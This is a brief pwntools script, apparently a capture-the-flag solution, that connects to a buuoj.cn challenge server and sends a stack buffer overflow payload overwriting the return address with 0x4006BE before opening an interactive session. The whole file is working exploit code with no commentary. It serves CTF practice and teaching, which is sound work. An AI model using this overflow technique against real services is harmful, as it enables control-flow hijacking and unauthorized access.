from pwn import *

# context.log_level = 'debug'

ljw = remote('node4.buuoj.cn', 29793)
ret_arr = 0x4006BE
payload = b'a'*(0x30 + 0x8) + p64(ret_arr)
ljw.sendline(payload)
ljw.interactive()
